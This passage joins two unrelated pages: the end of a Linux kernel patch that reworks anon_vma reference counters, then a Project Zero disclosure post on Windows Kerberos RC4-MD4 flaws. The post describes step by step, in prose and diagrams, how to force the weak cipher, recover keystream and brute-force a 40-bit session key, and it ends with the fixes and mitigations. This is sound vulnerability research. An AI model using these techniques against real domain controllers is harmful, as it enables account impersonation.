GFP\_KERNEL); if (anon\_vma) { atomic\_set(&anon\_vma->refcount, 1);- anon\_vma->degree = 1; /\* Reference for first vma \*/+ anon\_vma->num\_children = 0;+ anon\_vma->num\_active\_vmas = 0; anon\_vma->parent = anon\_vma; /\* \* Initialise the anon\_vma root to point to itself. If called@@ -201,6 +202,7 @@ int \_\_anon\_vma\_prepare(struct vm\_area\_struct \*vma) anon\_vma = anon\_vma\_alloc(); if (unlikely(!anon\_vma)) goto out\_enomem\_free\_avc;+ anon\_vma->num\_children++; /\* self-parent link for new root \*/ allocated = anon\_vma; } @@ -210,8 +212,7 @@ int \_\_anon\_vma\_prepare(struct vm\_area\_struct \*vma) if (likely(!vma->anon\_vma)) { vma->anon\_vma = anon\_vma; anon\_vma\_chain\_link(vma, avc, anon\_vma);- /\* vma reference or self-parent link for new root \*/- anon\_vma->degree++;+ anon\_vma->num\_active\_vmas++; allocated = NULL; avc = NULL; }@@ -296,19 +297,19 @@ int anon\_vma\_clone(struct vm\_area\_struct \*dst, struct vm\_area\_struct \*src) anon\_vma\_chain\_link(dst, avc, anon\_vma);  /\*- \* Reuse existing anon\_vma if its degree lower than two,- \* that means it has no vma and only one anon\_vma child.+ \* Reuse existing anon\_vma if it has no vma and only one+ \* anon\_vma child. \*- \* Do not choose parent anon\_vma, otherwise first child- \* will always reuse it. Root anon\_vma is never reused:+ \* Root anon\_vma is never reused: \* it has self-parent reference and at least one child. \*/ if (!dst->anon\_vma && src->anon\_vma &&- anon\_vma != src->anon\_vma && anon\_vma->degree < 2)+ anon\_vma->num\_children < 2 &&+ anon\_vma->num\_active\_vmas == 0) dst->anon\_vma = anon\_vma; } if (dst->anon\_vma)- dst->anon\_vma->degree++;+ dst->anon\_vma->num\_active\_vmas++; unlock\_anon\_vma\_root(root); return 0; @@ -358,6 +359,7 @@ int anon\_vma\_fork(struct vm\_area\_struct \*vma, struct vm\_area\_struct \*pvma) anon\_vma = anon\_vma\_alloc(); if (!anon\_vma) goto out\_error;+ anon\_vma->num\_active\_vmas++; avc = anon\_vma\_chain\_alloc(GFP\_KERNEL); if (!avc) goto out\_error\_free\_anon\_vma;@@ -378,7 +380,7 @@ int anon\_vma\_fork(struct vm\_area\_struct \*vma, struct vm\_area\_struct \*pvma) vma->anon\_vma = anon\_vma; anon\_vma\_lock\_write(anon\_vma); anon\_vma\_chain\_link(vma, avc, anon\_vma);- anon\_vma->parent->degree++;+ anon\_vma->parent->num\_children++; anon\_vma\_unlock\_write(anon\_vma);  return 0;@@ -410,7 +412,7 @@ void unlink\_anon\_vmas(struct vm\_area\_struct \*vma) \* to free them outside the lock. \*/ if (RB\_EMPTY\_ROOT(&anon\_vma->rb\_root.rb\_root)) {- anon\_vma->parent->degree--;+ anon\_vma->parent->num\_children--; continue; } @@ -418,7 +420,7 @@ void unlink\_anon\_vmas(struct vm\_area\_struct \*vma) anon\_vma\_chain\_free(avc); } if (vma->anon\_vma) {- vma->anon\_vma->degree--;+ vma->anon\_vma->num\_active\_vmas--;  /\* \* vma would still be needed after unlink, and anon\_vma will be prepared@@ -436,7 +438,8 @@ void unlink\_anon\_vmas(struct vm\_area\_struct \*vma) list\_for\_each\_entry\_safe(avc, next, &vma->anon\_vma\_chain, same\_vma) { struct anon\_vma \*anon\_vma = avc->anon\_vma; - VM\_WARN\_ON(anon\_vma->degree);+ VM\_WARN\_ON(anon\_vma->num\_children);+ VM\_WARN\_ON(anon\_vma->num\_active\_vmas); put\_anon\_vma(anon\_vma);  list\_del(&avc->same\_vma); |
| --- |

generated by [cgit 1.2.3-korg](https://git.zx2c4.com/cgit/about/) ([git 2.43.0](https://git-scm.com/)) at 2025-01-15 10:09:39 +0000



=== Content from googleprojectzero.blogspot.com_ac3130e7_20250115_225531.html ===


# [Project Zero](https://googleprojectzero.blogspot.com/)

News and updates from the Project Zero team at Google

## Thursday, October 27, 2022

### [RC4 Is Still Considered Harmful](https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html)

By James Forshaw, Project Zero

I've been spending a lot of time researching Windows authentication implementations, specifically Kerberos. In June 2022 I found an interesting issue number [2310](https://bugs.chromium.org/p/project-zero/issues/detail?id=2310) with the handling of RC4 encryption that allowed you to authenticate as another user if you could either interpose on the Kerberos network traffic to and from the KDC or directly if the user was configured to disable typical pre-authentication requirements.

This blog post goes into more detail on how this vulnerability works and how I was able to exploit it with only a bare minimum of brute forcing required. Note, I'm not going to spend time fully explaining how Kerberos authentication works, there's plenty of resources online. For example [this blog post](https://syfuhs.net/a-bit-about-kerberos) by [Steve Syfuhs](https://twitter.com/SteveSyfuhs) who works at Microsoft is a good first start.

## Background

Kerberos is a very old authentication protocol. The current version (v5) was described in [RFC1510](https://datatracker.ietf.org/doc/html/rfc1510) back in 1993, although it was updated in [RFC4120](https://datatracker.ietf.org/doc/html/rfc4120) in 2005. As Kerberos' core security concept is using encryption to prove knowledge of a user's credentials the design allows for negotiating the encryption and checksum algorithms that the client and server will use.

For example when sending the initial authentication service request (AS-REQ) to the Key Distribution Center (KDC) a client can specify a list supported encryption algorithms, as predefined integer identifiers, as shown below in the snippet of the ASN.1 definition from RFC4120.

KDC-REQ-BODY    ::= SEQUENCE {

...

    etype    [8] SEQUENCE OF Int32 -- EncryptionType

                                   -- in preference order --,

...

}

When the server receives the request it checks its list of supported encryption types and the ones the user's account supports (which is based on what keys the user has configured) and then will typically choose the one the client most preferred. The selected algorithm is then used for anything requiring encryption, such as generating session keys or the EncryptedData structure as shown below:

EncryptedData   ::= SEQUENCE {

        etype   [0] Int32 -- EncryptionType --,

        kvno    [1] UInt32 OPTIONAL,

        cipher  [2] OCTET STRING -- ciphertext

}

The KDC will send back an authentication service reply (AS-REP) structure containing the user's Ticket Granting Ticket (TGT) and an EncryptedData structure which contains the session key necessary to use the TGT to request service tickets. The user can then use their known key which corresponds to the requested encryption algorithm to decrypt the session key and complete the authentication process.

[![Alt Text: Diagram showing the based Kerberos authentication and requesting an AES key type.](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRE6Kj-svyxGDL8OhnPM46jhk7cf3JEJrssrRSwToM3q63wAaqtboIVHeEiZ5bONQoHZNapfdxpDr3kXMbxLakja1tqshef6N4GDNlw1BXyhanRY_Jg2zDqTlIPmHZBZ2XvCMf_23GXoRSS-18_zLCfwYV2v4xOR5usrM4zq1AONy2U57oCk-n-BpW/s1062/image5.png "Alt Text: Diagram showing the based Kerberos authentication and requesting an AES key type.")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRE6Kj-svyxGDL8OhnPM46jhk7cf3JEJrssrRSwToM3q63wAaqtboIVHeEiZ5bONQoHZNapfdxpDr3kXMbxLakja1tqshef6N4GDNlw1BXyhanRY_Jg2zDqTlIPmHZBZ2XvCMf_23GXoRSS-18_zLCfwYV2v4xOR5usrM4zq1AONy2U57oCk-n-BpW/s1062/image5.png)

This flexibility in selecting an encryption algorithm is both a blessing and a curse. In the original implementations of Kerberos only DES encryption was supported, which by modern standards is far too weak. Because of the flexibility developers were able to add support for AES through [RFC3962](https://datatracker.ietf.org/doc/html/rfc3962) which is supported by all modern versions of Windows. This can then be negotiated between client and server to use the best algorithm both support. However, unless weak algorithms are explicitly disabled there's nothing stopping a malicious client or server from downgrading the encryption algorithm in use and trying to break Kerberos using cryptographic attacks.

Modern versions of Windows have started to disable DES as a supported encryption algorithm, preferring AES. However, there's another encryption algorithm which Windows supports which is still enabled by default, [RC4](https://en.wikipedia.org/wiki/RC4). This algorithm was used in Kerberos by Microsoft for Windows 2000, although its documentation was in draft form until [RFC4757](https://datatracker.ietf.org/doc/html/rfc4757) was released in 2006.

The RC4 stream cipher has many substantial weaknesses, but when it was introduced it was still considered a better option than DES which has been shown to be sufficiently vulnerable to hardware cracking such as the EFF's "[Deep Crack](https://en.wikipedia.org/wiki/EFF_DES_cracker)". Using RC4 also had the advantage that it was relatively easy to operate in a reduced key size mode to satisfy US export requirements of cryptographic systems.

If you read the RFC for the implementation of RC4 in Kerberos, you'll notice it doesn't use the stream cipher as is. Instead it puts in place various protections to guard against common cryptographic attacks:

* The encrypted data is protected by a keyed MD5 HMAC hash to prevent tampering which is trivial with a simple stream cipher such as RC4. The hashed data includes a randomly generated 8-byte "confounder" so that the hash is randomized even for the same plain text.
* The key used for the encryption is derived from the hash and a base key. This, combined with the confounder makes it almost certain the same key is never reused for the encryption.
* The base key is not the user's key, but instead is derived from a MD5 HMAC keyed with the user's key over a 4 byte message type value. For example the message type is different for the AS-REQ and the AS-REP structures. This prevents an attacker using Kerberos as an encryption oracle and reusing existing encrypted data in unrelated parts of the protocol.

Many of the known weaknesses of RC4 are related to gathering a significant quantity of ciphertext encrypted with a known key. Due to the design of the RC4-HMAC algorithm and the general functional principles of Kerberos this is not really a significant concern. However, the biggest weakness of RC4 as defined by Microsoft for Kerberos is not so much the algorithm, but the generation of the user's key from their password.

As already mentioned Kerberos was introduced in Windows 2000 to replace the existing NTLM authentication process used from NT 3.1. However, there was a problem of migrating existing users to the new authentication protocol. In general the KDC doesn't store a user's password, instead it stores a hashed form of that password. For NTLM this hash was generated from the Unicode password using a single pass of the MD4 algorithm. Therefore to make an easy upgrade path Microsoft specified that the RC4-HMAC Kerberos key was this same hash value.

As the MD4 output is 16 bytes in size it wouldn't be practical to brute force the entire key. However, the hash algorithm has no protections against brute-force attacks for example no salting or multiple iterations. If an attacker has access to ciphertext encrypted using the RC4-HMAC key they can attempt to brute force the key through guessing the password. As user's will tend to choose weak or trivial passwords this increases the chance that a brute force attack would work to recover the key. And with the key the attacker can then authenticate as that user to any service they like.

To get appropriate cipher text the attacker can make requests to the KDC and specify the encryption type they need. The most well known attack technique is called [Kerberoasting](https://attack.mitre.org/techniques/T1558/003/). This technique requests a service ticket for the targeted user and specifies the RC4-HMAC encryption type as their preferred algorithm. If the user has an RC4 key configured then the ticket returned can be encrypted using the RC4-HMAC algorithm. As significant parts of the plain-text is known for the ticket data the attacker can try to brute force the key from that.

This technique does require the attacker to have an account on the KDC to make the service ticket request. It also requires that the user account has a configured Service Principal Name (SPN) so that a ticket can be requested. Also modern versions of Windows Server will try to block this attack by forcing the use of AES keys which are derived from the service user's password over RC4 even if the attacker only requested RC4 support.

An alternative form is called [AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/). Instead of requesting a service ticket this relies on the initial authentication requests to return encrypted data. When a user sends an AS-REQ structure, the KDC can look up the user, generate the TGT and its associated session key then return that information encrypted using the user's RC4-HMAC key. At this point the KDC hasn't verified the client knows the user's key before returning the encrypted data, which allows the attacker to brute force the key without needing to have an account themselves on the KDC.

Fortunately this attack is more rare because Windows's Kerberos implementation requires pre-authentication. For a password based logon the user uses their encryption key to encrypt a timestamp value which is sent to the KDC as part of the AS-REQ. The KDC can decrypt the timestamp, check it's within a small time window and only then return the user's TGT and encrypted session key. This would prevent an attacker getting encrypted data for the brute force attack.

However, Windows does support a user account flag, "Do not require Kerberos preauthentication". If this flag is enabled on a user the authentication request does not require the encrypted timestamp to be sent and the AS-REP roasting process can continue. This should be an uncommon configuration.

The success of the brute-force attack entirely depends on the password complexity. Typically service user accounts have a long, at least 25 character, randomly generated password which is all but impossible to brute force. Normal users would typically have weaker passwords, but they are less likely to have a configured SPN which would make them targets for Kerberoasting. The system administrator can also mitigate the attack by disabling RC4 entirely across the network, though this is not commonly done for compatibility reasons. A more limited alternative is to add sensitive users to the [Protected Users Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group), which disables RC4 for them without having to disable it across the entire network.

## Windows Kerberos Encryption Implementation

While working on researching Windows Defender Credential Guard (CG) I wanted to understand how Windows actually implements the various Kerberos encryption schemes. The primary goal of CG at least for Kerberos is to protect the user's keys, specifically the ones derived from their password and session keys for the TGT. If I could find a way of using one of the keys with a weak encryption algorithm I hoped to be able to extract the original key removing CG's protection.

The encryption algorithms are all implemented inside the CRYPTDLL.DLL library which is separate from the core Kerberos library in KERBEROS.DLL on the client and KDCSVC.DLL on the server. This interface is undocumented but it's fairly easy to work out how to call the exported functions. For example, to get a "crypto system" from the encryption type integer you can use the following exported function:

NTSTATUS CDLocateCSystem(int etype, KERB\_ECRYPT\*\* engine);

The KERB\_ECRYPT structure contains configuration information for the engine such as the size of the key and function pointers to convert a password to a key, generate new session keys, and perform encryption or decryption. The structure also contains a textual name so that you can get a quick idea of what algorithm is supposed to be, which lead to the following supported systems:

Name                                    Encryption Type

----                                    ---------------

RSADSI RC4-HMAC                         24

RSADSI RC4-HMAC                         23

Kerberos AES256-CTS-HMAC-SHA1-96        18

Kerberos AES128-CTS-HMAC-SHA1-96        17

Kerberos DES-CBC-MD5                    3

Kerberos DES-CBC-CRC                    1

RSADSI RC4-MD4                          -128

Kerberos DES-Plain                      -132

RSADSI RC4-HMAC                         -133

RSADSI RC4                              -134

RSADSI RC4-HMAC                         -135

RSADSI RC4-EXP                          -136

RSADSI RC4                              -140

RSADSI RC4-EXP                          -141

Kerberos AES128-CTS-HMAC-SHA1-96-PLAIN  -148

Kerberos AES256-CTS-HMAC-SHA1-96-PLAIN  -149

Encryption types with positive values are well-known encryption types defined in the RFCs, whereas negative values are private types. Therefore I decided to spend my time on these private types. Most of the private types were just subtle variations on the existing well-known types, or clones with legacy numbers.

However, one stood out as being different from the rest, "RSADSI RC4-MD4" with type value -128. This was different because the implementation was incredibly insecure, specifically it had the following properties:

* Keys are 16 bytes in size, but only the first 8 of the key bytes are used by the encryption algorithm.
* The key is used as-is, there's no blinding so the key stream is always the same for the same user key.
* The message type is ignored, which means that the key stream is the same for different parts of the Kerberos protocol when using the same key.
* The encrypted data does not contain any cryptographic hash to protect from tampering with the ciphertext which for RC4 is basically catastrophic. Even though the name contains MD4 this is only used for deriving the key from the password, not for any message integrity.
* Generated session keys are 16 bytes in size but only contain 40 bits (5 bytes) of randomness. The remaining 11 bytes are populated with the fixed value of 0xAB.

To say this is bad from a cryptographic standpoint, is an understatement. Fortunately it would be safe to assume that while this crypto system is implemented in CRYPTDLL, it wouldn't be used by Kerberos? Unfortunately not — it is totally accepted as a valid encryption type when sent in the AS-REQ to the KDC. The question then becomes how to exploit this behavior?

## Exploitation on the Wire (CVE-2022-33647)

My first thoughts were to attack the session key generation. If we could get the server to return the AS-REP with a RC4-MD4 session key for the TGT then any subsequent usage of that key could be captured and used to brute force the 40 bit key. At that point we could take the user's TGT which is sent in the clear and the session key and make requests as that authenticated user.

The most obvious approach to forcing the preferred encryption type to be RC4-MD4 would be to interpose the connection between a client and the KDC. The etype field of the AS-REQ is not protected for password based authentication. Therefore a proxy can modify the field to only include RC4-MD4 which is then sent to the KDC. Once that's completed the proxy would need to also capture a service ticket request to get encrypted data to brute force.

Brute forcing the 40 bit key would be technically feasible at least if you built a giant lookup table, however I felt like it's not practical. I realized there's a simpler way, when a client authenticates it typically sends a request to the KDC with no pre-authentication timestamp present. As long as pre-authentication hasn't been disabled the KDC returns a Kerberos error to the client with the KDC\_ERR\_PREAUTH\_REQUIRED error code.

As part of that error response the KDC also sends a list of acceptable encryption types in the [PA-ETYPE-INFO2](https://datatracker.ietf.org/doc/html/rfc4120#section-5.2.7.5) pre-authentication data structure. This list contains additional information for the password to key derivation such as the salt for AES keys. The client can use this information to correctly generate the encryption key for the user. I noticed that if you sent back only a single entry indicating support for RC4-MD4 then the client would use the insecure algorithm for generating the pre-authentication timestamp. This worked even if the client didn't request RC4-MD4 in the first place.

When the KDC received the timestamp it would validate it using the RC4-MD4 algorithm and return the AS-REP with the TGT's RC4-MD4 session key encrypted using the same key as the timestamp. Due to the already mentioned weaknesses in the RC4-MD4 algorithm the key stream used for the timestamp must be the same as used in the response to encrypt the session key. Therefore we could mount a known-plaintext attack to recover the keystream from the timestamp and use that to decrypt parts of the response.

[![Diagram showing the attack process. A computer with a kerberos client sends an AS-REQ to the attacker, which returns an error requesting pre-authentication and selecting RC4-MD4 encryption. The client then converts the user's password into an RC4-MD4 key which is used to encrypt the timestamp to send to the KDC. This is used to validate the user authentication and an AS-REP is returned with a TGT session key generated for RC4-MD4.](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUvTW1UFAq2BkR82D8pZBtol-7uMDtXUhYYWtsdj59L02yosepSSb2zaddG7GkNt9t8YvR7pQogCoZDMv9shMSF_iq0V4pIuDCt-o042w285bolE5_s3gGXZKI-XreYKDGzT48ShCCbyijZU0dDvrpFTVl-Kk4KYX6gYokC4vjlq6GpZt9_rfBRgje/s600/image3.png "Diagram showing the attack process. A computer with a kerberos client sends an AS-REQ to the attacker, which returns an error requesting pre-authentication and selecting RC4-MD4 encryption. The client then converts the user's password into an RC4-MD4 key which is used to encrypt the timestamp to send to the KDC. This is used to validate the user authentication and an AS-REP is returned with a TGT session key generated for RC4-MD4.")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUvTW1UFAq2BkR82D8pZBtol-7uMDtXUhYYWtsdj59L02yosepSSb2zaddG7GkNt9t8YvR7pQogCoZDMv9shMSF_iq0V4pIuDCt-o042w285bolE5_s3gGXZKI-XreYKDGzT48ShCCbyijZU0dDvrpFTVl-Kk4KYX6gYokC4vjlq6GpZt9_rfBRgje/s1465/image3.png)

The timestamp itself has the following ASN.1 structure, which is serialized using the [Distinguished Encoding Rules (DER)](https://en.wikipedia.org/wiki/X.690#DER_encoding) and then encrypted.

PA-ENC-TS-ENC           ::= SEQUENCE {

     patimestamp     [0] KerberosTime -- client's time --,

     pausec          [1] Microseconds OPTIONAL

}

The AS-REP encrypted response has the following ASN.1 structure:

EncASRepPart  ::= SEQUENCE {

     key             [0] EncryptionKey,

     last-req        [1] LastReq,

     nonce           [2] UInt32,

     key-expiration  [3] KerberosTime OPTIONAL,

     flags           [4] TicketFlags,

     authtime        [5] KerberosTime,

     starttime       [6] KerberosTime OPTIONAL,

     endtime         [7] KerberosTime,

     renew-till      [8] KerberosTime OPTIONAL,

     srealm          [9] Realm,

     sname           [10] PrincipalName,

     caddr           [11] HostAddresses OPTIONAL

}

We can see from the two structures that as luck would have it the session key in the AS-REP is at the start of the encrypted data. This means there should be an overlap between the known parts of the timestamp and the key, allowing us to apply key stream recovery to decrypt the session key without any brute force needed.

[![Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows there is an overlap between known bytes in the timestamp with the 40 bit session key in the AS-REP.](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg24DDfsRh9c8OtrHaHSYfjKbUOPqVKpbrgf1ifZslYw1JDXAv8Q3hXmZRzz3MSsByAMoAg7Tpj5OIw3VzE5e9mrqIQ_fs-pLE61jHNF47qF1dBr-zFg7OV5hOSuDLJy7b9vYJm6hw5tDmK2-Oznd1hzj1a8NlBNBnGfxdX2lQfkrxQtGkhFy_nz9xR/s600/image1.png "Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows there is an overlap between known bytes in the timestamp with the 40 bit session key in the AS-REP.")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg24DDfsRh9c8OtrHaHSYfjKbUOPqVKpbrgf1ifZslYw1JDXAv8Q3hXmZRzz3MSsByAMoAg7Tpj5OIw3VzE5e9mrqIQ_fs-pLE61jHNF47qF1dBr-zFg7OV5hOSuDLJy7b9vYJm6hw5tDmK2-Oznd1hzj1a8NlBNBnGfxdX2lQfkrxQtGkhFy_nz9xR/s1187/image1.png)

The diagram shows the ASN.1 DER structures for the timestamp and the start of the AS-REP. The values with specific hex digits in green are plain-text we know or can calculate as they are part of the ASN.1 structure such as types and lengths. We can see that there's a clear overlap between 4 bytes of known data in the timestamp with the first 4 bytes of the session key. We only need the first 5 bytes of the key due to the padding at the end, but this does mean we need to brute force the final key byte.

We can do this brute force one of two ways. First we can send service ticket requests with the user's TGT and a guess for the session key to the KDC until one succeeds. This would require at most 256 requests to the KDC. Alternatively we can capture a service ticket request from the client which is likely to happen immediately after the authentication. As the service ticket request will be encrypted using the session key we can perform the brute force attack locally without needing to talk to the KDC which will be faster. Regardless of the option chosen this approach would be orders of magnitude faster than brute forcing the entire 40 bit session key.

The simplest approach to performing this exploit would be to interpose the client to server connection and modify traffic. However, as the initial request without pre-authentication just returns an error message it's likely the exploit could be done by injecting a response back to the client while the KDC is processing the real request. This could be done with only the ability to monitor network traffic and inject arbitrary network traffic back into that network. However, I've not verified that approach.

## Exploitation without Interception (CVE-2022-33679)

The requirement to have access to the client to server authentication traffic does make this vulnerability seem less impactful. Although there's plenty of scenarios where an attacker could interpose, such as shared wifi networks, or physical attacks which could be used to compromise the computer account authentication which would take place when a domain joined system was booted.

It would be interesting if there was an attack vector to exploit this without needing a real Kerberos user at all. I realized that if a user has pre-authentication disabled then we have everything we need to perform the attack. The important point is that if pre-authentication is disabled we can request a TGT for the user, specifying RC4-MD4 encryption and the KDC will send back the AS-REP encrypted using that algorithm.

The key to the exploit is to reverse the previous attack, instead of using the timestamp to decrypt the AS-REP we'll use the AS-REP to encrypt a timestamp. We can then use the timestamp value when sent to the KDC as an encryption oracle to brute force enough bytes of the key stream to decrypt the TGT's session key. For example, if we remove the optional microseconds component of the timestamp we get the following DER encoded values:

[![Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows there is an overlap between known bytes in the AS-REP and the timestamp string which can be used to generate a valid encrypted timestamp.](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiJwOslmDADrdMxHQePmjJB4AwNGPGaFkdemYZCTgtHzSOcKYXYq46I5ETenRLGSjx-aPpCGMj40oox50HylEiImPmompOLGzAs0mNSRbjQtEUWhlNl6xv3XWladvkt__nep8zR4GEcMTLUHzqpC5ECmGSjYlr7CINK8BP3lBrX8n5u1hTKwcrBzMEd/s600/image2.png "Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows there is an overlap between known bytes in the AS-REP and the timestamp string which can be used to generate a valid encrypted timestamp.")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiJwOslmDADrdMxHQePmjJB4AwNGPGaFkdemYZCTgtHzSOcKYXYq46I5ETenRLGSjx-aPpCGMj40oox50HylEiImPmompOLGzAs0mNSRbjQtEUWhlNl6xv3XWladvkt__nep8zR4GEcMTLUHzqpC5ECmGSjYlr7CINK8BP3lBrX8n5u1hTKwcrBzMEd/s1057/image2.png)

The diagram shows that currently there's no overlap between the timestamp, represented by the T bytes, and the 40 bit session key. However, we know or at least can calculate the entire DER encoded data for the AS-REP to cover the entire timestamp buffer. We can use this to calculate the keystream for the user's RC4-MD4 key without actually knowing the key itself. With the key stream we can encrypt a valid timestamp and send it to the KDC.

If the KDC responds with a valid AS-REP then we know we've correctly calculated the key stream. How can we use this to start decrypting the session key? The KerberosTime value used for the timestamp is an ASCII string of the form YYYYMMDDHHmmssZ. The KDC parses this string to a format suitable for processing by the server. The parser takes the time as a NUL terminated string, so we can add an additional NUL character to the end of the string and it shouldn't affect the parsing. Therefore we can change the timestamp to the following:

[![Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows there is an overlap between a final NUL character at the end of the timestamp string which overlaps with the first byte of the 40 bit session key.](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiHkQxlTmqYoIrJDtSjALIbuKT6vXVkaSM2QGjB8aErmNyny_lSLBJt4ZogLrR2naCcnSc15TiR-oq45Xj2-WDfmZpNzs1k0RYZH2VQKpLb6Whj8Z4nNkc5DIK_CdQvfT3ncuVdLnAdMSBhclQIYpIWB26fmbSWaVzdQXwYkbnnz6iPxYCGJ1sNY7rM/s1032/image4.png "Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows there is an overlap between a final NUL character at the end of the timestamp string which overlaps with the first byte of the 40 bit session key.")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiHkQxlTmqYoIrJDtSjALIbuKT6vXVkaSM2QGjB8aErmNyny_lSLBJt4ZogLrR2naCcnSc15TiR-oq45Xj2-WDfmZpNzs1k0RYZH2VQKpLb6Whj8Z4nNkc5DIK_CdQvfT3ncuVdLnAdMSBhclQIYpIWB26fmbSWaVzdQXwYkbnnz6iPxYCGJ1sNY7rM/s1032/image4.png)

We can now guess a value for the encrypted NUL character and send the new timestamp to the KDC. If the KDC returns an error we know that the parsing failed as it didn't decrypt to a NUL character. However, if the authentication succeeds the value we guessed is the next byte in the key stream and we can decrypt the first byte of the session key.

At this point we've got a problem, we can't just add another NUL character as the parser would stop on the first one we sent. Even if the value didn't decrypt to a NUL it wouldn't be possible to detect. This is when a second trick comes into play, instead of extending the string we can abuse the way value lengths are encoded in DER. A length can be in one of two forms, a short form if the length is less than 128, or a long form for everything else.

For the short form the length is encoded in a single byte. For the long form, the first byte has the top bit set to 1, and the lower 7 bits encode the number of trailing bytes of the length value in big-endian format. For example in the above diagram the timestamp's total size is 0x14 bytes which is stored in the short form. We can instead encode the length in an arbitrary sized long form, for example 0x81 0x14, 0x82 0x00 0x14, 0x83 0x00 0x00 0x14 etc. The examples shown below move the NUL character to brute force the next two bytes of the session key:

[![Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows extending the first length field so there is an overlap between a final NUL character at the end of the timestamp string which overlaps with the second and third bytes of the 40 bit session key.](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgsKgGYAwo0YMFIjyz2Htl9U6igMxgQULM7SMPuDKr4jsQckfpZSvEUSshnUpNK15rRJD5ZD9mjSOgFn7F2_vgCGr1HHHGXRuGQZmMqHwAV7c7JairJhIUONjxM7YVBkWxBdxC9MfuXPxfISUEzVaPeRG5EsvlL91sgnZs4gXMjApMLYcZq4oXy7ZEg/s1038/image6.png "Diagram showing ASN.1 DER structures for the timestamp and encrypted AS-REP part. It shows extending the first length field so there is an overlap between a final NUL character at the end of the timestamp string which overlaps with the second and third bytes of the 40 bit session key.")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgsKgGYAwo0YMFIjyz2Htl9U6igMxgQULM7SMPuDKr4jsQckfpZSvEUSshnUpNK15rRJD5ZD9mjSOgFn7F2_vgCGr1HHHGXRuGQZmMqHwAV7c7JairJhIUONjxM7YVBkWxBdxC9MfuXPxfISUEzVaPeRG5EsvlL91sgnZs4gXMjApMLYcZq4oXy7ZEg/s1038/image6.png)

Even though technically DER should expect the shortest form necessary to encode the length the Microsoft ASN.1 library doesn't enforce that when parsing so we can just repeat this length encoding trick to cover the remaining 4 unknown bytes of the key. As the exploit brute forces one byte at a time the maximum number of requests that we'd need to send to the KDC is 5 × 28 which is 1280 requests as opposed to 240 requests which would be around 1 trillion.

Even with such a small number of requests it can still take around 30 seconds to brute force the key, but that still makes it a practical attack. Although it would be very noisy on the network and you'd expect any competent EDR system to notice, it might be too late at that point.

## The Fixes

The only fix I can find is in the KDC service for the domain controller. Microsoft has added a new flag which by default disables the RC4-MD4 algorithm and an old variant of RC4-HMAC with the encryption type of -133. This behavior can be re-enabled by setting the KDC configuration registry value AllowOldNt4Crypto. The reference to NT4 is a good indication on how long this vulnerability has existed as it presumably pre-dates the introduction of Kerberos in Windows 2000. There are probably some changes to the client as well, but I couldn't immediately find them and it's not really worth my time to reverse engineer it.

It'd be good to mitigate the risk of similar attacks before they're found. Disabling RC4 is definitely recommended, however that can bring [its own problems](https://syfuhs.net/lessons-in-disabling-rc4-in-active-directory). If this particular vulnerability was being exploited in the wild it should be pretty easy to detect. Also unusual Kerberos encryption types would be an immediate red-flag as well as the repeated login attempts.

Another option is to enforce [Kerberos Armoring (FAST)](https://syfuhs.net/kerberos-fast-armoring) on all clients and KDCs in the environment. This would make it more difficult to inspect and tamper with Kerberos authentication traffic. However it's not a panacea, for example for FAST to work the domain joined computer needs to first authenticate without FAST to get a key they can then use for protecting the communications. If that initial authentication is compromised the entire protection fails.

Posted by
Tim

at

[12:48 PM](https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html "permanent link")

[No comments:](https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4838136820032157985&postID=8303427457754488503&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=8303427457754488503&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=8303427457754488503&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=8303427457754488503&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=8303427457754488503&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=8303427457754488503&target=pinterest "Share to Pinterest")

[Newer Posts](https://googleprojectzero.blogspot.com/search?updated-max=2022-11-04T08:50:00-07:00&max-results=1&reverse-paginate=true "Newer Posts")

[Older Posts](https://googleprojectzero.blogspot.com/search?updated-max=2022-10-27T12:48:00-07:00&max-results=1 "Older Posts")

[Home](https://googleprojectzero.blogspot.com/)

Subscribe to:
[Posts (Atom)](https://googleprojectzero.blogspot.com/feeds/posts/default)

## Search This Blog

|  |  |
| --- | --- |

## Pages

* [About Project Zero](https://googleprojectzero.blogspot.com/p/about-project-zero.html)
* [Working at Project Zero](https://googleprojectzero.blogspot.com/p/working-at-project-zero.html)
* [0day "In the Wild"](https://googleprojectzero.blogspot.com/p/0day.html)
* [0day Exploit Root Cause Analyses](https://googleprojectzero.github.io/0days-in-the-wild/rca.html)
* [Vulnerability Disclosure FAQ](https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html)

## Archives

* ►
